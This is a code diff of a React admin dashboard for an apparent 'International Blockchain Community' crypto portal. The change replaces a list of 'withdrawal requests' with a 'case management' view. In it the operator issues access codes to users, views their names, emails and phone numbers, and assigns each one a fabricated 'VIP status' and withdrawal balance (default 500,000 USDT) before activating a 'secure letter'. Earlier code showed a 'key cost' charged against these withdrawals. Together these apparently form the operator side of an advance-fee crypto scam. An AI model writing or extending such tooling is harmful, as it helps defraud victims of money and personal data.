@@ -2,6 +2,8 @@ import React, { useEffect, useState } from "react";
 import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
 import { Button } from "@/components/ui/button";
 import { Badge } from "@/components/ui/badge";
+import { Input } from "@/components/ui/input";
+import { Label } from "@/components/ui/label";
 import { 
   Table, 
   TableBody, 
@@ -10,38 +12,115 @@ import {
   TableHeader, 
   TableRow 
 } from "@/components/ui/table";
-import { Dialog, DialogContent, DialogDescription, DialogHeader, DialogTitle } from "@/components/ui/dialog";
-import { ShieldAlert, RefreshCw, Trash2, Lock, Search, Filter, Eye, FileText, Printer, Download } from "lucide-react";
+import { Dialog, DialogContent, DialogDescription, DialogHeader, DialogTitle, DialogFooter } from "@/components/ui/dialog";
+import { ShieldAlert, RefreshCw, Trash2, Lock, Search, Filter, Eye, FileText, Printer, Download, Plus, UserCheck } from "lucide-react";
 import ibcLogo from "@assets/generated_images/professional_corporate_logo_for_international_blockchain_community.png";
+import { useToast } from "@/hooks/use-toast";
 
-interface Submission {
+interface AdminData {
+  vipStatus: string;
+  username: string;
+  withdrawalAmount: string;
+  withdrawalBatches: string;
+  physilocal0: string;
+}
+
+interface Case {
   id: string;
-  user: string;
-  option: "A" | "B";
-  amount: string;
-  cost: string;
-  timestamp: string;
-  status: string;
+  accessCode: string;
+  status: 'created' | 'registered' | 'syncing' | 'active' | 'completed';
+  user?: {
+    name: string;
+    email: string;
+    mobile: string;
+  };
+  adminData?: AdminData;
+  submission?: {
+    option: "A" | "B";
+    timestamp: string;
+  };
 }
 
 export default function AdminDashboard() {
-  const [submissions, setSubmissions] = useState<Submission[]>([]);
-  const [selectedSubmission, setSelectedSubmission] = useState<Submission | null>(null);
+  const [cases, setCases] = useState<Case[]>([]);
+  const [selectedCase, setSelectedCase] = useState<Case | null>(null);
+  const [isCreateOpen, setIsCreateOpen] = useState(false);
+  const [newAccessCode, setNewAccessCode] = useState("");
+  const [isFinalizeOpen, setIsFinalizeOpen] = useState(false);
+  const [finalizeData, setFinalizeData] = useState<AdminData>({
+    vipStatus: "Gold Tier",
+    username: "",
+    withdrawalAmount: "500,000 USDT",
+    withdrawalBatches: "10",
+    physilocal0: "PHY-001"
+  });
+  
+  const { toast } = useToast();
 
   const loadData = () => {
-    const data = JSON.parse(localStorage.getItem('ibc_submissions') || '[]');
-    setSubmissions(data);
+    const data = JSON.parse(localStorage.getItem('ibc_cases') || '[]');
+    setCases(data);
   };
 
   useEffect(() => {
     loadData();
+    // Poll for changes (simulating real-time updates from users)
+    const interval = setInterval(loadData, 2000);
+    return () => clearInterval(interval);
   }, []);
 
   const clearData = () => {
     if(confirm("Clear all simulated records?")) {
-      localStorage.removeItem('ibc_submissions');
+      localStorage.removeItem('ibc_cases');
       loadData();
     }
+  };
+
+  const handleCreateCase = () => {
+    if (!newAccessCode) return;
+    
+    const newCase: Case = {
+      id: `CASE-${Math.floor(Math.random() * 100000)}`,
+      accessCode: newAccessCode,
+      status: 'created'
+    };
+    
+    const updatedCases = [newCase, ...cases];
+    localStorage.setItem('ibc_cases', JSON.stringify(updatedCases));
+    setCases(updatedCases);
+    setIsCreateOpen(false);
+    setNewAccessCode("");
+    toast({ title: "Case Created", description: `Access Code: ${newCase.accessCode}` });
+  };
+
+  const openFinalizeModal = (c: Case) => {
+    setSelectedCase(c);
+    setFinalizeData({
+      ...finalizeData,
+      username: c.user?.name || ""
+    });
+    setIsFinalizeOpen(true);
+  };
+
+  const handleFinalize = () => {
+    if (!selectedCase) return;
+    
+    const updatedCases = cases.map(c => {
+      if (c.id === selectedCase.id) {
+        return {
+          ...c,
+          status: 'active' as const,
+          adminData: finalizeData
+        };
+      }
+      return c;
+    });
+    
+    localStorage.setItem('ibc_cases', JSON.stringify(updatedCases));
+    setCases(updatedCases);
+    setIsFinalizeOpen(false);
+    setSelectedCase(null);
+    toast({ title: "Account Activated", description: "User can now access the secure letter." });
   };
 
   return (
@@ -72,12 +151,12 @@ export default function AdminDashboard() {
       <main className="p-6 max-w-7xl mx-auto">
         <div className="flex justify-between items-end mb-6">
           <div>
-            <h2 className="text-2xl font-bold text-white mb-1">Withdrawal Requests</h2>
-            <p className="text-slate-400 text-sm">Real-time monitoring of secure phrase key protocols.</p>
+            <h2 className="text-2xl font-bold text-white mb-1">Case Management</h2>
+            <p className="text-slate-400 text-sm">Manage secure access codes and approve synchronizations.</p>
           </div>
           <div className="flex gap-2">
-            <Button variant="outline" size="sm" className="border-slate-700 bg-slate-800 text-slate-300 hover:bg-slate-700 hover:text-white" onClick={loadData}>
-              <RefreshCw className="w-4 h-4 mr-2" /> Refresh
+            <Button onClick={() => setIsCreateOpen(true)} className="bg-blue-600 hover:bg-blue-700 text-white">
+              <Plus className="w-4 h-4 mr-2" /> New Case
             </Button>
             <Button variant="destructive" size="sm" onClick={clearData}>
               <Trash2 className="w-4 h-4 mr-2" /> Clear Logs
@@ -85,48 +164,27 @@ export default function AdminDashboard() {
           </div>
         </div>
 
-        {/* Stats Grid */}
-        <div className="grid grid-cols-1 md:grid-cols-4 gap-4 mb-8">
-          <Card className="bg-slate-950 border-slate-800">
-            <CardContent className="p-6">
-              <div className="text-slate-400 text-xs uppercase font-bold mb-2">Total Pending</div>
-              <div className="text-3xl font-bold text-white">{submissions.length}</div>
-            </CardContent>
-          </Card>
-          <Card className="bg-slate-950 border-slate-800">
-            <CardContent className="p-6">
-              <div className="text-slate-400 text-xs uppercase font-bold mb-2">Active Keys</div>
-              <div className="text-3xl font-bold text-blue-400">0</div>
-            </CardContent>
-          </Card>
-          <Card className="bg-slate-950 border-slate-800">
-            <CardContent className="p-6">
-              <div className="text-slate-400 text-xs uppercase font-bold mb-2">Flagged Reviews</div>
-              <div className="text-3xl font-bold text-amber-500">0</div>
-            </CardContent>
-          </Card>
-          <Card className="bg-slate-950 border-slate-800">
-            <CardContent className="p-6">
-              <div className="text-slate-400 text-xs uppercase font-bold mb-2">System Status</div>
-              <div className="text-lg font-bold text-green-400 flex items-center gap-2 mt-1">
-                <ShieldAlert className="w-5 h-5" /> Operational
+        {/* Pending Actions Alert */}
+        {cases.some(c => c.status === 'syncing') && (
+          <div className="mb-6 bg-amber-500/10 border border-amber-500/20 rounded-lg p-4 flex items-center justify-between">
+            <div className="flex items-center gap-3 text-amber-500">
+              <ShieldAlert className="w-6 h-6 animate-pulse" />
+              <div>
+                <h3 className="font-bold">Action Required</h3>
+                <p className="text-sm opacity-80">There are users waiting for synchronization approval.</p>
               </div>
-            </CardContent>
-          </Card>
-        </div>
+            </div>
+          </div>
+        )}
 
         {/* Data Table */}
         <Card className="bg-slate-950 border-slate-800 overflow-hidden">
           <CardHeader className="border-b border-slate-800 bg-slate-900/50 py-4">
              <div className="flex justify-between items-center">
-               <CardTitle className="text-base font-medium text-white">Recent Transmissions</CardTitle>
+               <CardTitle className="text-base font-medium text-white">Active Cases</CardTitle>
                <div className="flex gap-2">
-                 <div className="relative">
-                   <Search className="w-4 h-4 absolute left-2.5 top-2.5 text-slate-500" />
-                   <input type="text" placeholder="Search ref..." className="bg-slate-900 border border-slate-700 rounded-md pl-9 pr-4 py-1.5 text-sm text-slate-200 focus:outline-none focus:border-blue-500 w-48" />
-                 </div>
-                 <Button variant="outline" size="icon" className="border-slate-700 bg-slate-800 text-slate-400">
-                   <Filter className="w-4 h-4" />
+                 <Button variant="outline" size="sm" className="border-slate-700 bg-slate-800 text-slate-300" onClick={loadData}>
+                   <RefreshCw className="w-4 h-4 mr-2" /> Refresh
                  </Button>
                </div>
              </div>
@@ -135,57 +193,65 @@ export default function AdminDashboard() {
             <Table>
               <TableHeader className="bg-slate-900">
                 <TableRow className="hover:bg-slate-900 border-slate-800">
-                  <TableHead className="text-slate-400 w-[150px]">Reference ID</TableHead>
-                  <TableHead className="text-slate-400">Timestamp</TableHead>
+                  <TableHead className="text-slate-400 w-[120px]">Status</TableHead>
+                  <TableHead className="text-slate-400">Access Code</TableHead>
                   <TableHead className="text-slate-400">User Identity</TableHead>
-                  <TableHead className="text-slate-400">Protocol</TableHead>
-                  <TableHead className="text-slate-400 text-right">Value</TableHead>
-                  <TableHead className="text-slate-400 text-right">Key Cost</TableHead>
-                  <TableHead className="text-slate-400 text-center">Status</TableHead>
+                  <TableHead className="text-slate-400">Mobile / Email</TableHead>
                   <TableHead className="text-slate-400 text-center">Action</TableHead>
                 </TableRow>
               </TableHeader>
               <TableBody>
-                {submissions.length === 0 ? (
+                {cases.length === 0 ? (
                   <TableRow className="hover:bg-transparent border-slate-800">
-                    <TableCell colSpan={8} className="text-center py-12 text-slate-500">
-                      No secure transmissions received yet.
+                    <TableCell colSpan={5} className="text-center py-12 text-slate-500">
+                      No active cases. Create one to get started.
                     </TableCell>
                   </TableRow>
                 ) : (
-                  submissions.map((sub) => (
-                    <TableRow key={sub.timestamp} className="hover:bg-slate-900/50 border-slate-800 group">
-                      <TableCell className="font-mono text-blue-400 font-medium">{sub.id}</TableCell>
-                      <TableCell className="text-slate-300 text-xs">
-                        {new Date(sub.timestamp).toLocaleString()}
-                      </TableCell>
-                      <TableCell className="text-white font-medium">{sub.user}</TableCell>
+                  cases.map((c) => (
+                    <TableRow key={c.id} className="hover:bg-slate-900/50 border-slate-800 group">
                       <TableCell>
                         <Badge variant="outline" className={`
-                          ${sub.option === 'A' 
-                            ? 'border-blue-500/30 bg-blue-500/10 text-blue-400' 
-                            : 'border-slate-500/30 bg-slate-500/10 text-slate-400'
-                          }
+                          ${c.status === 'created' ? 'text-slate-400 border-slate-700' : ''}
+                          ${c.status === 'registered' ? 'text-blue-400 border-blue-700 bg-blue-500/10' : ''}
+                          ${c.status === 'syncing' ? 'text-amber-400 border-amber-700 bg-amber-500/10 animate-pulse' : ''}
+                          ${c.status === 'active' ? 'text-green-400 border-green-700 bg-green-500/10' : ''}
+                          ${c.status === 'completed' ? 'text-purple-400 border-purple-700 bg-purple-500/10' : ''}
                         `}>
-                          Option {sub.option}
+                          {c.status.toUpperCase()}
                         </Badge>
                       </TableCell>
-                      <TableCell className="text-right text-slate-200">{sub.amount}</TableCell>
-                      <TableCell className="text-right text-amber-400 font-mono text-xs">{sub.cost}</TableCell>
-                      <TableCell className="text-center">
-                        <Badge className="bg-amber-500/10 text-amber-500 hover:bg-amber-500/20 border-amber-500/20">
-                          {sub.status}
-                        </Badge>
+                      <TableCell className="font-mono text-white font-bold tracking-wider">{c.accessCode}</TableCell>
+                      <TableCell className="text-slate-300">
+                        {c.user ? (
+                           <div className="font-medium text-white">{c.user.name}</div>
+                        ) : (
+                          <span className="text-slate-600 italic">Pending Login...</span>
+                        )}
+                      </TableCell>
+                      <TableCell className="text-slate-400 text-sm">
+                        {c.user ? (
+                          <div className="flex flex-col">
+                            <span>{c.user.email}</span>
+                            <span className="text-xs opacity-70">{c.user.mobile}</span>
+                          </div>
+                        ) : (
+                          "-"
+                        )}
                       </TableCell>
                       <TableCell className="text-center">
-                        <Button 
-                          variant="ghost" 
-                          size="sm" 
-                          className="h-8 w-8 p-0 text-slate-400 hover:text-white hover:bg-slate-800"
-                          onClick={() => setSelectedSubmission(sub)}
-                        >
-                          <Eye className="w-4 h-4" />
-                        </Button>
+                        {c.status === 'syncing' && (
+                          <Button 
+                            size="sm" 
+                            className="bg-amber-600 hover:bg-amber-700 text-white w-full"
+                            onClick={() => openFinalizeModal(c)}
+                          >
+                            Finalize Sync
+                          </Button>
+                        )}
+                        {c.status === 'active' && c.submission && (
+                          <Badge variant="secondary">Option {c.submission.option}</Badge>
+                        )}
                       </TableCell>
                     </TableRow>
                   ))
@@ -196,81 +262,97 @@ export default function AdminDashboard() {
         </Card>
       </main>
 
-      {/* Detail Modal */}
-      <Dialog open={!!selectedSubmission} onOpenChange={(open) => !open && setSelectedSubmission(null)}>
-        <DialogContent className="bg-slate-950 border-slate-800 text-slate-100 sm:max-w-lg">
+      {/* Create Case Modal */}
+      <Dialog open={isCreateOpen} onOpenChange={setIsCreateOpen}>
+        <DialogContent className="bg-slate-950 border-slate-800 text-slate-100">
           <DialogHeader>
-            <DialogTitle className="flex items-center gap-2 text-xl">
-              <FileText className="w-5 h-5 text-blue-500" />
-              Submission Details
-            </DialogTitle>
+            <DialogTitle>Create Secure Access Case</DialogTitle>
             <DialogDescription className="text-slate-400">
-              Full secure transmission record from ISO-D Gateway.
+              Generate a unique password for the user to access the portal.
             </DialogDescription>
           </DialogHeader>
+          <div className="py-4">
+            <Label htmlFor="code" className="text-slate-400">Access Password</Label>
+            <Input 
+              id="code" 
+              value={newAccessCode} 
+              onChange={(e) => setNewAccessCode(e.target.value)}
+              className="bg-slate-900 border-slate-700 text-white mt-2"
+              placeholder="e.g. 774982" 
+            />
+          </div>
+          <DialogFooter>
+            <Button variant="ghost" onClick={() => setIsCreateOpen(false)}>Cancel</Button>
+            <Button onClick={handleCreateCase} className="bg-blue-600 text-white">Create Case</Button>
+          </DialogFooter>
+        </DialogContent>
+      </Dialog>
 
-          {selectedSubmission && (
-            <div className="space-y-6 py-4">
-              <div className="bg-slate-900 rounded-md p-4 border border-slate-800 grid grid-cols-2 gap-4">
-                <div>
-                  <div className="text-xs text-slate-500 uppercase mb-1">Reference ID</div>
-                  <div className="font-mono text-blue-400 font-bold">{selectedSubmission.id}</div>
-                </div>
-                <div>
-                  <div className="text-xs text-slate-500 uppercase mb-1">Timestamp</div>
-                  <div className="text-sm text-slate-300">{new Date(selectedSubmission.timestamp).toLocaleString()}</div>
-                </div>
-                <div className="col-span-2 border-t border-slate-800 pt-3 mt-1">
-                  <div className="text-xs text-slate-500 uppercase mb-1">User Identity</div>
-                  <div className="font-medium text-white text-lg">{selectedSubmission.user}</div>
-                </div>
+      {/* Finalize Sync Modal */}
+      <Dialog open={isFinalizeOpen} onOpenChange={setIsFinalizeOpen}>
+        <DialogContent className="bg-slate-950 border-slate-800 text-slate-100">
+          <DialogHeader>
+            <DialogTitle>Finalize Account Reactivation</DialogTitle>
+            <DialogDescription className="text-slate-400">
+              Input user details to complete synchronization.
+            </DialogDescription>
+          </DialogHeader>
+          
+          <div className="grid gap-4 py-4">
+            <div className="grid grid-cols-2 gap-4">
+              <div className="space-y-2">
+                <Label className="text-slate-400">VIP Status</Label>
+                <Input 
+                  value={finalizeData.vipStatus}
+                  onChange={(e) => setFinalizeData({...finalizeData, vipStatus: e.target.value})}
+                  className="bg-slate-900 border-slate-700 text-white"
+                />
               </div>
-
-              <div className="space-y-4">
-                <h4 className="text-sm font-bold text-slate-300 uppercase tracking-wide border-b border-slate-800 pb-2">
-                  Selection Protocol
-                </h4>
-                
-                <div className="grid grid-cols-2 gap-4">
-                  <div className="p-3 bg-slate-900/50 rounded border border-slate-800">
-                    <div className="text-xs text-slate-500 mb-1">Selected Option</div>
-                    <div className="text-white font-bold flex items-center gap-2">
-                      <span className="w-6 h-6 rounded bg-blue-500/20 text-blue-400 flex items-center justify-center text-xs">
-                        {selectedSubmission.option}
-                      </span>
-                      {selectedSubmission.option === 'A' ? 'Accelerated' : 'Standard'}
-                    </div>
-                  </div>
-                  <div className="p-3 bg-slate-900/50 rounded border border-slate-800">
-                    <div className="text-xs text-slate-500 mb-1">Status</div>
-                    <Badge className="bg-amber-500/10 text-amber-500 hover:bg-amber-500/20 border-amber-500/20">
-                      {selectedSubmission.status}
-                    </Badge>
-                  </div>
-                </div>
-
-                <div className="grid grid-cols-2 gap-4">
-                  <div>
-                    <div className="text-xs text-slate-500 mb-1">Withdrawal Amount</div>
-                    <div className="text-lg font-medium text-white">{selectedSubmission.amount}</div>
-                  </div>
-                  <div>
-                    <div className="text-xs text-slate-500 mb-1">Required Key Cost</div>
-                    <div className="text-lg font-mono font-bold text-amber-400">{selectedSubmission.cost}</div>
-                  </div>
-                </div>
-              </div>
-
-              <div className="flex gap-3 pt-4">
-                <Button className="flex-1 bg-blue-600 hover:bg-blue-700 text-white gap-2">
-                  <Printer className="w-4 h-4" /> Print Record
-                </Button>
-                <Button variant="outline" className="flex-1 border-slate-700 text-slate-300 hover:bg-slate-800 gap-2">
-                  <Download className="w-4 h-4" /> Export PDF
-                </Button>
+              <div className="space-y-2">
+                <Label className="text-slate-400">Physilocal0</Label>
+                <Input 
+                  value={finalizeData.physilocal0}
+                  onChange={(e) => setFinalizeData({...finalizeData, physilocal0: e.target.value})}
+                  className="bg-slate-900 border-slate-700 text-white"
+                />
               </div>
             </div>
-          )}
+
+            <div className="space-y-2">
+              <Label className="text-slate-400">Username</Label>
+              <Input 
+                value={finalizeData.username}
+                onChange={(e) => setFinalizeData({...finalizeData, username: e.target.value})}
+                className="bg-slate-900 border-slate-700 text-white"
+              />
+            </div>
+
+            <div className="grid grid-cols-2 gap-4">
+              <div className="space-y-2">
+                <Label className="text-slate-400">Withdrawal Amount</Label>
+                <Input 
+                  value={finalizeData.withdrawalAmount}
+                  onChange={(e) => setFinalizeData({...finalizeData, withdrawalAmount: e.target.value})}
+                  className="bg-slate-900 border-slate-700 text-white"
+                />
+              </div>
+              <div className="space-y-2">
+                <Label className="text-slate-400">Batches</Label>
+                <Input 
+                  value={finalizeData.withdrawalBatches}
+                  onChange={(e) => setFinalizeData({...finalizeData, withdrawalBatches: e.target.value})}
+                  className="bg-slate-900 border-slate-700 text-white"
+                />
+              </div>
+            </div>
+          </div>
+
+          <DialogFooter>
+            <Button variant="ghost" onClick={() => setIsFinalizeOpen(false)}>Cancel</Button>
+            <Button onClick={handleFinalize} className="bg-green-600 hover:bg-green-700 text-white gap-2">
+              <UserCheck className="w-4 h-4" /> Accept & Finalize
+            </Button>
+          </DialogFooter>
         </DialogContent>
       </Dialog>
     </div>
